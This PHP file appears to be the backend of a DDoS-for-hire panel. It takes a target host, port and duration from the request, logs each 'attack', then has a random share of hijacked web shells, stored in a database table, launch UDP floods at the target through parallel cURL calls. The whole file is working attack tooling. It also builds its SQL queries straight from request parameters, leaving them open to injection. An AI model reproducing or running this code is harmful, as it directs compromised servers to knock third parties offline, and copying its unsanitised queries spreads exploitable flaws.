<?php

include_once("login/includes/db.php"); 					//Include the database connection
$query=mysql_query("SELECT * FROM stats");
$row=mysql_fetch_array($query, MYSQL_ASSOC);
		$timenow = time();
 		$host = $_GET['host'];  							//Set the host GET to an easier to use variable
		$user = $_GET['user'];  							//Set the HWID GET to an easier to use variable
		$port = $_GET['port'];  							//Set the port GET to an easier to use variable
		$shells = $_GET['power'];
		$ip = $_GET['ip'];									//Get the users IP, for logging
		$time = $_GET['time'];								//Set the time GET to an easier to use variable

if ($_SERVER['REMOTE_ADDR'] == $_SERVER['SERVER_ADDR']) {
		 
$query=mysql_query("SELECT * FROM stats");					//Prepare the query for configuration
$row=mysql_fetch_array($query, MYSQL_ASSOC);				//Fetch the rows
$dbpercentage = $row['percentage'];							//Get the master shell use percentage
 		
$fullcurl = "?act=phptools&host=".$host."&time=".$time."&type=udp&port=".$port;  //GET data for the cURL handler
$sql = "SELECT * FROM badips WHERE ip='$host'";
$query = mysql_query($sql);
$num = mysql_num_rows($query);
		if ($num == 0) {
if((isset($_GET['host'])) and (isset($_GET['user'])) and (isset($_GET['port'])) and (isset($_GET['time']))){ 		//If sending GET data

	ignore_user_abort(TRUE); 						//Let the page be exited and the script continue
			
	$query_log = "INSERT INTO logs (user, ip, target, duration, shells, time) VALUE ('$user', '$ip', '$host', '$time', '$shells', '$timenow' )";
	mysql_query($query_log) or die(mysql_error());			//Log the attack

	$sql = "SELECT COUNT(*) FROM shells"; 					//Count the rows in the table
	$result = mysql_query($sql); 							//Run the count query
	$row = mysql_fetch_array($result); 						//Get the array for the rows
	$rows_in_table = $row[0]; 								//Set it to a variable
 
	$percentage = $dbpercentage / 100.0; //Set the percentage
	$count = intval(round($rows_in_table * $percentage));	//Set the percentage to select by
			
    $SQL = mysql_query("SELECT url FROM shells WHERE status='up' ORDER BY RAND() LIMIT {$count}") ; //Select the shells
    $mh = curl_multi_init();								//Initialize the multi_handle
    $handles = array();										//Create an array for the handles
	
    while($resultSet = mysql_fetch_array($SQL)){         	//While fetching the rows
            $ch = curl_init($resultSet['url'] . $fullcurl); //Load the urls and send GET data
            curl_setopt($ch, CURLOPT_TIMEOUT, 3);          //Only load it for 15 seconds (Long enough to send the data) 
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_multi_add_handle($mh, $ch);				//Add the handles to the multi_handle
            $handles[] = $ch;								//Load the array into a handle
    }

    $running = null;										// Create a status variable so we know when exec is done.
    do { 													//execute the handles
      curl_multi_exec($mh,$running);      					// Call exec.  This call is non-blocking, meaning it works in the background.
      usleep(200000); 										// Sleep while it's executing.  You could do other work here, if you have any.
    } while ($running > 0);									// Keep going until it's done.

    foreach($handles as $ch)								// For loop to remove (close) the regular handles.
    {
      curl_multi_remove_handle($mh, $ch);					// Remove the current array handle.
    } 
    curl_multi_close($mh);									// Close the multi handle
	
			echo "success";									//Successful. Tell the client to start the timer
		}else
		{
		mysql_query("INSERT INTO badlogs (user, ip, target, reason, time) VALUE ('$user', '$ip', '$host', 'Wrong GET info', '$timenow' )"); 
		}
		}else{
			mysql_query("INSERT INTO badlogs (user, ip, target, reason, time) VALUE ('$user', '$ip', '$host', 'Blacklisted IP', '$timenow' )"); 
			echo 'BLACKLISTED IP';
		}
		}else{
			mysql_query("INSERT INTO badlogs (user, ip, target, reason, time) VALUE ('$user', '$scriptip', '$host', 'NOT THE SCRIPT', '$timenow' )"); 
			echo 'not the script';
		}		
		
		?>